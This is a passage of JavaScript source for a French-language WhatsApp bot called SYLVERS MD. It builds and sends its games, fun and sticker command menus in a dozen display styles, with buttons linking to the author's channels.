        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-jeux': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Game* 」✣───╮
│${setv} ╭─────────╮
│${setv} │${prefix}truth 🅡
│${setv} │${prefix}dare 🅡
│${setv} │${prefix}suit 🅡
│${setv} │${prefix}tictactoe 🅡
│${setv} │${prefix}math 🅡
│${setv} │${prefix}playbomb 🅡
│${setv} │${prefix}casino 🅡
│${setv} │${prefix}rob 🅡
│${setv} │${prefix}slot 🅡
│${setv} │${prefix}dice 🅡 
│${setv} │${prefix} profile 🅡
│${setv} │${prefix} claim 🅡
│${setv} │${prefix} tmoney 🅡
│${setv} │${prefix} tflimit 🅡
│${setv} ╰──────────╯
╰─────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-fun': {
let kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣──╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Fun* 」✣─────╮
│${setv} ╭─────────╮
│${setv} │${prefix}definir 🅡
│${setv} │${prefix}voir-plus 🅡
│${setv} │${prefix}fact 🅡
│${setv} │${prefix}couple 🅡
│${setv} │${prefix}ame-soeur 🅡
│${setv} │${prefix}stupidcheck 🅡
│${setv} │${prefix}handsomecheck 🅡
│${setv} │${prefix}uncleancheck 🅡
│${setv} │${prefix}hotcheck 🅡
│${setv} │${prefix}smartcheck 🅡
│${setv} │${prefix}greatcheck 🅡
│${setv} │${prefix}evilcheck 🅡
│${setv} │${prefix}dogcheck 🅡
│${setv} │${prefix}coolcheck 🅡
│${setv} │${prefix}waifucheck 🅡
│${setv} │${prefix}awesomecheck 🅡
│${setv} │${prefix}gaycheck 🅡
│${setv} │${prefix}cutecheck 🅡
│${setv} │${prefix}lesbiancheck 🅡
│${setv} │${prefix}hornycheck 🅡
│${setv} │${prefix}prettycheck 🅡
│${setv} │${prefix}lovelycheck 🅡
│${setv} │${prefix}uglycheck 🅡
│${setv} │${prefix}pick 🅡
│${setv} │${prefix}pickupline 🅡
│${setv} │${prefix}quotes 🅡
│${setv} │${prefix}can 🅡
│${setv} │${prefix}est-ce 🅡
│${setv} │${prefix}quand 🅡
│${setv} │${prefix}ou 🅡
│${setv} │${prefix}quest-ceque 🅡
│${setv} │${prefix}comment 🅡
│${setv} │${prefix}noter 🅡
│${setv} │${prefix}cry 🅡
│${setv} │${prefix}kill 🅡
│${setv} │${prefix}hug 🅡
│${setv} │${prefix}pat 🅡
│${setv} │${prefix}lick 🅡 
│${setv} │${prefix}kiss 🅡
│${setv} │${prefix}bite 🅡
│${setv} │${prefix}yeet 🅡
│${setv} │${prefix}bully 🅡
│${setv} │${prefix}bonk 🅡
│${setv} │${prefix}wink 🅡
│${setv} │${prefix}poke 🅡
│${setv} │${prefix}nom 🅡
│${setv} │${prefix}slap 🅡
│${setv} │${prefix}smile 🅡 
│${setv} │${prefix}wave 🅡
│${setv} │${prefix}awoo 🅡
│${setv} │${prefix}blush 🅡
│${setv} │${prefix}smug 🅡
│${setv} │${prefix}glomp ?? 
│${setv} │${prefix}happy 🅡
│${setv} │${prefix}dance 🅡
│${setv} │${prefix}cringe 🅡
│${setv} │${prefix}cuddle 🅡
│${setv} │${prefix}highfive 🅡 
│${setv} │${prefix}handhold 🅡
│${setv} │${prefix}spank 🅡
│${setv} │${prefix}tickle 🅡
│${setv} │${prefix}feed 🅡
│${setv} │${prefix}checkme 🅡
│${setv} ╰──────────╯
╰─────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 's11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kevmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Tout-Menu🧾","id":"${prefix}tout-menu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 's12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kevmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU🧾",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT-MENU",
"title":"cliquez pour selectionner",
"description":"Afficher la liste de toutes les commandes",
"id":"${prefix}tout-menu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine YouTube \",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Groupe Telegram \",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Compte GitHub \",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Chaine WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Proprio 👤","id":"${prefix}proprio"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu-sticker': {
let kevmenu_oh = `
╭──✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰──────✣ ${readmore}
╭──✣「 *GUIDE* 」✣───╮
│➠ *🅟 = pour le proprio * 
│➠ *🅡 = Pour les randoms*
│➠ *🅑 =pour les boss*
╰────────────────╯
╭──✣「 *Sticker* 」✣──╮
│${setv} ╭─────────╮
│${setv} │${prefix}goose 🅡
│${setv} │${prefix}woof 🅡
│${setv} │${prefix}8ball 🅡
│${setv} │${prefix}lizard 🅡
│${setv} │${prefix}meow 🅡
│${setv} │${prefix}gura 🅡
│${setv} │${prefix}telestick 🅡
│${setv} ╰─────────╯
╰────────────────╯`
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
